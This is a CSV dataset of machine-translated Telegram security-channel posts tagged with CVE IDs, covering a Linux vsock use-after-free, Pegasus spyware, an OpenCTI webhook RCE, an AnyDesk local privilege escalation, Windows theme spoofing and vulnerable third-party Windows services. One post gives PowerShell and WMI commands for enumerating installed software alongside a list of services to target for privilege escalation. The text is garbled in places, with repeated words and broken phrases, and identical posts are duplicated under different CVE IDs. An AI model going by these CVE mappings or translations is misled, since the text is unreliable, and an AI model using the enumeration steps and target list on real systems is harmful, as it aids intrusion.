id,cve_id,channel_name,message,timestamp,message_url
11,CVE-2025-21756,tech_b0lt_Genona,"`` `The problem affects the implementation of sockets with the addressing of AFVSOCK, designed for the network interaction of applications of guest systems and hosts. The published exploit allows you to execute a Root code on systems with Linux 6.6.75 core systems. . . . The vulnerability is due to the fact that when the transport is redistributed for the AFVSOK socket, the VSOCKREMOVESCK function is called, which in turn causes the VSOCKREMOVEBUND function, which is incorrectly reducing the recorder of links to the VSOCK object. Thus, the reference counter becomes equal to zero and the nucleus frees the memory allocated for the object, despite the fact that it continues to be used .`` `Vulnerability in the Linux nucleus, which allows you to increase its privileges through VSOCK Original CVE-2025-21756: Attack of the VSOCK",2025-06-01 01:32:44.205125,https://t.me/tech_b0lt_Genona/5282
12,CVE-2019-3568,safebdv,"How does the smartphones of the presidents and politicians quietly listen to as fantasy imperceptibly? No. This is Pegasus - the most famous spy software on the planet for attacks on Apple and Android devices, what does it know? PEGASUS can do what ordinary viruses do not know how to turn on the camera and microphone without your knowledge to read whatsApp, telegram, e-mail and files to track your location in real time and most importantly: to infect the device without a single click-just through a missed call. This is called Zero-Click attack. In July 2021, the consortium of journalists (and Amnesty International published an investigation: Emmanuel Macron was in the list of goals of the PEGASUS spy program, developed by NSO Group. PEGASUS Software exploited different vulnerabilities, such as the vulnerabilities of overflow of the buffer into a Voip-glass WhatsApp for the installation of users for surveillance, and this was the side of the WhatsApp finally won the court against NSO Group, which is developing PEGASUS. Act. Targeted Over a Two-Week Period in April-May 2019. ""The country with the largest number of infections: Mexico-456 India-100 Bahrain-82 MAKIST-58 AMNESTY published a list of 50,000 goals: journalists, lawyers, diplomats. Global reaction: US The NSO has been included in the Black Parliament is investigated by Pegasus in Poland, Greece and Hungary Apple, Google, Microsoft and Meta filed collective lawsuits AWS, Azure, Google Clud disconnected NSO from all clouds of Israel ... It protects this company and others, what does it mean for us at least 10? They call such things “instruments for special services”. CISSP. In the same way, the world has once forbidden to a ban on the prohibition of surveillance without trial and who will control it on the sale of vulnerabilities under control. Circles, Intelxa Alliance, DarkMatter, Bae Systems Applied Intelligence, SS8, Nexa Technologies, Verint Systems, Tykelab, Trovicor, Rayzone Group, Elbit Systems, Palantir, Nice Systems, Wintego, Saito Tech.",2025-06-01 01:32:59.041708,https://t.me/safebdv/1205
13,CVE-2025-34028,safebdv,"You are attacking right now! Learn about the methods of attacks the first with Vulncheck Kev - this is more powerful and faster than Cisa Kev! I used to write about (-a list of vulnerabilities that are actively operated. But there are something cooler-(for example, they are operated right today (for Commvault Command Center, a popular reserve copying solution. As Vulncheck notes, in 2025 28.3% of vulnerability, were used in attacks within a day after disclosure. That Know the operated vulnerabilities and therefore Vulncheck Kev is required to use: it gives out daily updates: PoC on GitHub, Metasploit, X. Vulnerabilities appear earlier than in (> 2000 CVE with proven operation, many are not in CISA KEV! How to use: integrate in CI/CD, scanners or scanners or scanners or scanners or scanners or scanners or scanners or scanners or scanners SIEM. Bag-tracker.",2025-06-01 01:32:59.044475,https://t.me/safebdv/1197
14,CVE-2025-34028,safebdv,"You are attacking right now! Learn about the methods of attacks the first with Vulncheck Kev - this is more powerful and faster than Cisa Kev! I used to write about (-a list of vulnerabilities that are actively operated. But there are something cooler-(for example, they are operated right today (for Commvault Command Center, a popular reserve copying solution. As Vulncheck notes, in 2025 28.3% of vulnerability, were used in attacks within a day after disclosure. That Know the operated vulnerabilities and therefore Vulncheck Kev is required to use: it gives out daily updates: PoC on GitHub, Metasploit, X. Vulnerabilities appear earlier than in (> 2000 CVE with proven operation, many are not in CISA KEV! How to use: integrate in CI/CD, scanners or scanners or scanners or scanners or scanners or scanners or scanners or scanners or scanners SIEM. Bag-tracker.",2025-06-01 01:32:59.044522,https://t.me/safebdv/1197
15,CVE-2025-24977,poxek,"Critical vulnerability in Opencti in the popular platform for cyber intelligence and exchange of Opencti indicators - a critical vulnerability was discovered that allows the attacking infrastructure through the abuse of the Webhook mechanism. The essence of the problem: an attacker can send specially formed data to the Opencti Webhook interface, which will lead to remote execution of the commands and the complete compromise of the system. Operation is possible without preliminary authentication if Webhook is open on the Internet. Recommendations: Urgent update Opencti until the latest version with the closure of CVE-2025-24977 Check the Webhook settings, limit access only to trusted sources to analyze the journals of events for suspicious appeals more: ( #CVE2025 #opencti",2025-06-01 01:33:03.432007,https://t.me/poxek/5122
16,CVE-2025-24977,poxek,"Critical vulnerability in Opencti in the popular platform for cyber intelligence and exchange of Opencti indicators - a critical vulnerability was discovered that allows the attacking infrastructure through the abuse of the Webhook mechanism. The essence of the problem: an attacker can send specially formed data to the Opencti Webhook interface, which will lead to remote execution of the commands and the complete compromise of the system. Operation is possible without preliminary authentication if Webhook is open on the Internet. Recommendations: Urgent update Opencti until the latest version with the closure of CVE-2025-24977 Check the Webhook settings, limit access only to trusted sources to analyze the journals of events for suspicious appeals more: ( #CVE2025 #opencti",2025-06-01 01:33:03.432339,https://t.me/poxek/5122
17,CVE-2024-12754,RedTeambro,"Hi all! Recently, an interesting analysis of the LPE-vulnerability has been released by the improving mechanism itself is based on the possibility of monitoring the target file, which is copied to the directory accessible for reading a low-sensed user. It remains only for us to force Anydesk, working on behalf of the system, to read a file inaccessible to us. The author in the article uses SAM from Shadow Copy. I carried out the development, testing and debugging on Anydesk version 8.0.10, which I downloaded (you can try to put this vulnerability yourself using (from Google Project Zero. My implementation is available (it reads an arbitrary file, after which it copies its contents to the desktop user. Although Windows and actively promotes the protection mechanism, called the state (preventing the transition from references created by not administrators, but this rally often does not apply to services that were developed by third -party companies. The reason is simple: the developers do not know about it and forget to apply it, hence the LPE. Demo can be seen (",2025-06-01 01:33:07.939970,https://t.me/RedTeambro/418
18,CVE-2025-21308,RedTeambro,"Windows Theme Spooofing in Windows there are special files of the same with the same expansion `.Themes`. They allow you to customize the system using new coloring pages, color palettes, fonts and wallpaper. In 2023, POC came to vulnerability (((which was somehow not appreciated. In fact, it was a Built-in Loader. Everything was based on the fact that Explorer.exe, finding a special link to the styles file in the theme, will carry out remote loading DLL with a name ending on `vrf.dll`. The signature was carried out, but this check was bypassed by the TOCTOU attack, when the attacked SMB server, the DLL legitimate library is carried out for the first request, however, the first request was followed by the malicious library. NetNTLM HEARCHING WITHOUT AND WITHOUT AND WITHOUT AND WITHOUT AND THE ADDIDED AND THE ADDICTION OF THE RUSSISE OF THE RUSSISE OF THE CONDITIONAL UNC The function `PathisUNC`-if the path was on a network ball, then Explorer.exe did not try to load the files for the theme. There was no analysis, but appeared (MS slightly corrected the function and, it would seem, that was all, however, the adventures did not end, and appeared",2025-06-01 01:33:07.941943,https://t.me/RedTeambro/413
19,CVE-2023-38146,RedTeambro,"Windows Theme Spooofing in Windows there are special files of the same with the same expansion `.Themes`. They allow you to customize the system using new coloring pages, color palettes, fonts and wallpaper. In 2023, POC came to vulnerability (((which was somehow not appreciated. In fact, it was a Built-in Loader. Everything was based on the fact that Explorer.exe, finding a special link to the styles file in the theme, will carry out remote loading DLL with a name ending on `vrf.dll`. The signature was carried out, but this check was bypassed by the TOCTOU attack, when the attacked SMB server, the DLL legitimate library is carried out for the first request, however, the first request was followed by the malicious library. NetNTLM HEARCHING WITHOUT AND WITHOUT AND WITHOUT AND WITHOUT AND THE ADDIDED AND THE ADDICTION OF THE RUSSISE OF THE RUSSISE OF THE CONDITIONAL UNC The function `PathisUNC`-if the path was on a network ball, then Explorer.exe did not try to load the files for the theme. There was no analysis, but appeared (MS slightly corrected the function and, it would seem, that was all, however, the adventures did not end, and appeared",2025-06-01 01:33:07.941966,https://t.me/RedTeambro/413
20,CVE-2024-38030,RedTeambro,"Windows Theme Spooofing in Windows there are special files of the same with the same expansion `.Themes`. They allow you to customize the system using new coloring pages, color palettes, fonts and wallpaper. In 2023, POC came to vulnerability (((which was somehow not appreciated. In fact, it was a Built-in Loader. Everything was based on the fact that Explorer.exe, finding a special link to the styles file in the theme, will carry out remote loading DLL with a name ending on `vrf.dll`. The signature was carried out, but this check was bypassed by the TOCTOU attack, when the attacked SMB server, the DLL legitimate library is carried out for the first request, however, the first request was followed by the malicious library. NetNTLM HEARCHING WITHOUT AND WITHOUT AND WITHOUT AND WITHOUT AND THE ADDIDED AND THE ADDICTION OF THE RUSSISE OF THE RUSSISE OF THE CONDITIONAL UNC The function `PathisUNC`-if the path was on a network ball, then Explorer.exe did not try to load the files for the theme. There was no analysis, but appeared (MS slightly corrected the function and, it would seem, that was all, however, the adventures did not end, and appeared",2025-06-01 01:33:07.941977,https://t.me/RedTeambro/413
21,CVE-2024-21320,RedTeambro,"Windows Theme Spooofing in Windows there are special files of the same with the same expansion `.Themes`. They allow you to customize the system using new coloring pages, color palettes, fonts and wallpaper. In 2023, POC came to vulnerability (((which was somehow not appreciated. In fact, it was a Built-in Loader. Everything was based on the fact that Explorer.exe, finding a special link to the styles file in the theme, will carry out remote loading DLL with a name ending on `vrf.dll`. The signature was carried out, but this check was bypassed by the TOCTOU attack, when the attacked SMB server, the DLL legitimate library is carried out for the first request, however, the first request was followed by the malicious library. NetNTLM HEARCHING WITHOUT AND WITHOUT AND WITHOUT AND WITHOUT AND THE ADDIDED AND THE ADDICTION OF THE RUSSISE OF THE RUSSISE OF THE CONDITIONAL UNC The function `PathisUNC`-if the path was on a network ball, then Explorer.exe did not try to load the files for the theme. There was no analysis, but appeared (MS slightly corrected the function and, it would seem, that was all, however, the adventures did not end, and appeared",2025-06-01 01:33:07.941987,https://t.me/RedTeambro/413
22,CVE-2021-40539,RedTeambro,"Hi all! In addition to the standard Windows components, services from third -party suppliers can work on the system: tracking, setting, management, toys. For the most part, they also give danger, working on behalf of `nt authority \ system`. Moreover, as I understand it, such services should be updated independently using the appropriate company software, which complicates the process of controlling vulnerabilities and potentially gives us another vector of increase in privileges. There are quite a lot of ways to collect information on the system on the system: ``## extraction from the Get-Childitem registry ""hklm: \ software \ wow6432node \ microsoft \ windows \ currentversion \ uninstall"" | GET-ITEMPROPERTY | Were -object {$ .Displayname -ne $ null} | Select -object DisplayName, Displayversion, Publisher, Installdate # WMI WMIC Product Get Name, Version, Vendor # Seatbelt. \ Seatbelt.exe Installedproducts' Share with you a small list of vulnerable services that can help take the system on the final wheelbarrow. You definitely need to integrate this list into the repository (but I can’t come up with something. Maybe you have ideas? Manageengine Serviedesk - Manageengine adselfservice - ( - usermanager - (iTunes - (Razer - (Datacard XPS Card Printer Driver - (Appgate - (Seagate - (AWS VPN Client - (AIDA - (Vboxsds - (TeamViewer - (Gamingservice from Xbox - ( - (Chrome updater - (Plantronics Desktop Hub - (",2025-06-01 01:33:07.942602,https://t.me/RedTeambro/410
23,CVE-2021-44077,RedTeambro,"Hi all! In addition to the standard Windows components, services from third -party suppliers can work on the system: tracking, setting, management, toys. For the most part, they also give danger, working on behalf of `nt authority \ system`. Moreover, as I understand it, such services should be updated independently using the appropriate company software, which complicates the process of controlling vulnerabilities and potentially gives us another vector of increase in privileges. There are quite a lot of ways to collect information on the system on the system: ``## extraction from the Get-Childitem registry ""hklm: \ software \ wow6432node \ microsoft \ windows \ currentversion \ uninstall"" | GET-ITEMPROPERTY | Were -object {$ .Displayname -ne $ null} | Select -object DisplayName, Displayversion, Publisher, Installdate # WMI WMIC Product Get Name, Version, Vendor # Seatbelt. \ Seatbelt.exe Installedproducts' Share with you a small list of vulnerable services that can help take the system on the final wheelbarrow. You definitely need to integrate this list into the repository (but I can’t come up with something. Maybe you have ideas? Manageengine Serviedesk - Manageengine adselfservice - ( - usermanager - (iTunes - (Razer - (Datacard XPS Card Printer Driver - (Appgate - (Seagate - (AWS VPN Client - (AIDA - (Vboxsds - (TeamViewer - (Gamingservice from Xbox - ( - (Chrome updater - (Plantronics Desktop Hub - (",2025-06-01 01:33:07.942619,https://t.me/RedTeambro/410
24,CVE-2024-34329,RedTeambro,"Hi all! In addition to the standard Windows components, services from third -party suppliers can work on the system: tracking, setting, management, toys. For the most part, they also give danger, working on behalf of `nt authority \ system`. Moreover, as I understand it, such services should be updated independently using the appropriate company software, which complicates the process of controlling vulnerabilities and potentially gives us another vector of increase in privileges. There are quite a lot of ways to collect information on the system on the system: ``## extraction from the Get-Childitem registry ""hklm: \ software \ wow6432node \ microsoft \ windows \ currentversion \ uninstall"" | GET-ITEMPROPERTY | Were -object {$ .Displayname -ne $ null} | Select -object DisplayName, Displayversion, Publisher, Installdate # WMI WMIC Product Get Name, Version, Vendor # Seatbelt. \ Seatbelt.exe Installedproducts' Share with you a small list of vulnerable services that can help take the system on the final wheelbarrow. You definitely need to integrate this list into the repository (but I can’t come up with something. Maybe you have ideas? Manageengine Serviedesk - Manageengine adselfservice - ( - usermanager - (iTunes - (Razer - (Datacard XPS Card Printer Driver - (Appgate - (Seagate - (AWS VPN Client - (AIDA - (Vboxsds - (TeamViewer - (Gamingservice from Xbox - ( - (Chrome updater - (Plantronics Desktop Hub - (",2025-06-01 01:33:07.942628,https://t.me/RedTeambro/410
25,CVE-2022-25165,RedTeambro,"Hi all! In addition to the standard Windows components, services from third -party suppliers can work on the system: tracking, setting, management, toys. For the most part, they also give danger, working on behalf of `nt authority \ system`. Moreover, as I understand it, such services should be updated independently using the appropriate company software, which complicates the process of controlling vulnerabilities and potentially gives us another vector of increase in privileges. There are quite a lot of ways to collect information on the system on the system: ``## extraction from the Get-Childitem registry ""hklm: \ software \ wow6432node \ microsoft \ windows \ currentversion \ uninstall"" | GET-ITEMPROPERTY | Were -object {$ .Displayname -ne $ null} | Select -object DisplayName, Displayversion, Publisher, Installdate # WMI WMIC Product Get Name, Version, Vendor # Seatbelt. \ Seatbelt.exe Installedproducts' Share with you a small list of vulnerable services that can help take the system on the final wheelbarrow. You definitely need to integrate this list into the repository (but I can’t come up with something. Maybe you have ideas? Manageengine Serviedesk - Manageengine adselfservice - ( - usermanager - (iTunes - (Razer - (Datacard XPS Card Printer Driver - (Appgate - (Seagate - (AWS VPN Client - (AIDA - (Vboxsds - (TeamViewer - (Gamingservice from Xbox - ( - (Chrome updater - (Plantronics Desktop Hub - (",2025-06-01 01:33:07.942636,https://t.me/RedTeambro/410
